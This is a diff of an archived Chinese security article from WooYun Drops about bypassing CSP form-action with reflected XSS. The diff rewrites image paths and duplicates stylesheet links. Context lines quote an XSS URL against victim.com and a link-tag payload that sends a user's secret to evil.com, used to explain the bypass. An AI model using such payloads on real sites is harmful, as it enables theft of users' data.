@@ -3,7 +3,7 @@
 			<head>
 			     <title>利用反射型XSS二次注入绕过CSP form-action限制 - ca1n</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/14686">http://drops.wooyun.org/tips/14686</a></h1>
 				
@@ -47,11 +47,11 @@
 
 <p>在原本的form之前又加了一个form标签, 这个新的form标签没有闭合,并且直接碰到了老form标签, 这个时候会发生什么呢?</p>
 
-<p><img src="http://static.wooyun.org//drops/20160411/2016041115592587348pic22.png" alt="Screen Shot 2016-04-10 at 19.25.02"></p>
+<p><img src="../images_result/images/2016041115592587348pic22.png" alt="Screen Shot 2016-04-10 at 19.25.02"></p>
 
 <p>老form标签就这样消失了! 所以攻击者再次把用户的小秘密发送到了自己的服务器上, 而且这时本来应该是POST的secret因为老form标签的消失现在变成了GET发送, 请求变成了下面这样.</p>
 
-<p><img src="http://static.wooyun.org//drops/20160411/2016041115592611147pic31.png" alt="Screen Shot 2016-04-10 at 19.25.02"></p>
+<p><img src="../images_result/images/2016041115592611147pic31.png" alt="Screen Shot 2016-04-10 at 19.25.02"></p>
 
 <p>这下管理员郁闷了, 最后索性用CSP加上了form-action来白名单限定form标签的action指向, 那么这样是否还会出现问题呢?</p>
 
@@ -90,7 +90,7 @@ http://victim.com/secret.html?secret=xiao_mi_mi&amp;xss=&lt;link rel='subresourc
 <pre><code>#!html
 &lt;link rel='subresource' href='http://evil.com/wo_de_mi_mi.php'&gt;
 </code></pre></li>
-<li><p><img src="http://static.wooyun.org//drops/20160411/2016041115592750653pic41.png" alt="Screen Shot 2016-04-10 at 20.12.36"></p></li>
+<li><p><img src="../images_result/images/2016041115592750653pic41.png" alt="Screen Shot 2016-04-10 at 20.12.36"></p></li>
 </ol>
 
 <p>正是最后这个link标签泄露了本该POST发送的secret, 攻击者通过利用一个反射型XSS将CSP的form-action绕过.</p>
